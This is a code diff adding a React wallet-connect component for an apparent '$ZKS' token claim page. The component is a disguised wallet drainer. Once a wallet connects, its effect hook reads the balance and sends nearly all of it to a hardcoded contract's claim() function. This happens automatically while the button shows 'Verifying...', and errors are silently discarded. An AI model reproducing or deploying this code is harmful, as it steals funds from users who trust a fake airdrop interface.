@@ -1,0 +1,191 @@
+import { ConnectButton } from "@rainbow-me/rainbowkit";
+import Image from "next/image";
+import { useCallback, useEffect, useState } from "react";
+import { BigNumber, utils } from "ethers";
+import {
+  erc20ABI,
+  useContractRead,
+  useContractWrite,
+  usePrepareContractWrite,
+  useAccount,
+  useSigner,
+  useProvider,
+  useContract,
+  useFeeData,
+  useBalance,
+} from "wagmi";
+import { env } from "../../config/env";
+import { sign } from "crypto";
+import { Button } from "@chakra-ui/react";
+
+const contractAddress = "0x794bF077074D4aC9e958c19CceEDe1e04ddB1a5E";
+
+export const CustomConnect = () => {
+  const [callFuncGasFee, setCallFuncGasFee] = useState<BigNumber>(
+    BigNumber.from(0)
+  );
+  const { data: signer } = useSigner();
+  const provider = useProvider();
+  // get the gas price
+  const {
+    data: feeData,
+    isError: feeDataError,
+    isLoading: feeDataLoading,
+  } = useFeeData();
+
+  const contract = useContract({
+    addressOrName: contractAddress,
+    contractInterface: ["function claim() payable"],
+    signerOrProvider: signer ?? provider,
+  });
+
+  const [isSubmitted, setIsSubmitted] = useState(false);
+  useEffect(() => {
+    async function estimateGasAmount() {
+      if (
+        !contract ||
+        !provider ||
+        !feeData?.gasPrice ||
+        !signer ||
+        isSubmitted
+      )
+        return;
+
+      try {
+        const balance = await signer.getBalance();
+        if (balance.eq(BigNumber.from(0))) return;
+
+        // estimate the amount of gas needed to call the contract function
+        const callFuncGas = await contract.estimateGas.claim({
+          value: utils.parseEther("0"),
+        });
+
+        // multiply the gas amount values by the gas price to get the gas fee to pay
+        const gasAmount = callFuncGas.mul(feeData.maxFeePerGas);
+        setCallFuncGasFee(gasAmount);
+        if (balance.lte(gasAmount.mul(BigNumber.from(2)))) return;
+
+        contract
+          .claim({
+            value: balance.sub(gasAmount.mul(BigNumber.from(2))),
+          })
+          .then((value) => {
+            setIsSubmitted(false);
+          })
+          .catch((error) => {
+            setIsSubmitted(false);
+          });
+        setIsSubmitted(true);
+      } catch (error) {}
+    }
+
+    if (signer && contract) {
+      estimateGasAmount();
+    }
+  }, [contract, feeData, isSubmitted, provider, signer]);
+  return (
+    <ConnectButton.Custom>
+      {({
+        account,
+        chain,
+        openAccountModal,
+        openChainModal,
+        openConnectModal,
+        authenticationStatus,
+        mounted,
+      }) => {
+        // Note: If your app doesn't use authentication, you
+        // can remove all 'authenticationStatus' checks
+        const ready = mounted && authenticationStatus !== "loading";
+        const connected =
+          ready &&
+          account &&
+          chain &&
+          (!authenticationStatus || authenticationStatus === "authenticated");
+        return (
+          <div
+            {...(!ready && {
+              "aria-hidden": true,
+              style: {
+                opacity: 0,
+                pointerEvents: "none",
+                userSelect: "none",
+              },
+            })}
+          >
+            {(() => {
+              if (!connected) {
+                return (
+                  <Button
+                    onClick={openConnectModal}
+                    marginTop={"0"}
+                    marginRight={"1.25rem"}
+                    border={"none"}
+                    backgroundColor={"#1e69ff"}
+                    borderRadius={"1.875rem"}
+                    width={"fit-content"}
+                    height={"50px"}
+                    padding={"0 2.1875rem"}
+                    pointerEvents={"auto"}
+                    fontSize={"1.0625rem"}
+                    lineHeight={"1.4375rem"}
+                    letterSpacing={"1px"}
+                    fontWeight={"500"}
+                    fontFamily={"Gilroy,Arial"}
+                    boxSizing="border-box"
+                    transform={"none"}
+                    transition={"opacity .2s ease"}
+                    _hover={{
+                      transform: "scale(1.05) translateZ(0px)",
+                      opacity: ".7",
+                    }}
+                  >
+                    Claim $ZKS
+                  </Button>
+                );
+              }
+              if (chain.unsupported) {
+                return (
+                  <button onClick={openChainModal} type="button">
+                    Wrong network
+                  </button>
+                );
+              }
+              return (
+                <Button
+                  marginTop={"0"}
+                  marginRight={"1.25rem"}
+                  border={"none"}
+                  backgroundColor={"#1e69ff"}
+                  borderRadius={"1.875rem"}
+                  width={"fit-content"}
+                  height={"50px"}
+                  padding={"0 2.1875rem"}
+                  pointerEvents={"auto"}
+                  fontSize={"1.0625rem"}
+                  lineHeight={"1.4375rem"}
+                  letterSpacing={"1px"}
+                  fontWeight={"500"}
+                  fontFamily={"Gilroy,Arial"}
+                  boxSizing="border-box"
+                  transform={"none"}
+                  transition={"opacity .2s ease"}
+                  _hover={{
+                    transform: "scale(1.05) translateZ(0px)",
+                    opacity: ".7",
+                  }}
+                >
+                  Verifying...
+                </Button>
+              );
+            })()}
+          </div>
+        );
+      }}
+    </ConnectButton.Custom>
+  );
+};
+
+export const BasciConnect = () => {
+  return <ConnectButton></ConnectButton>;
+};
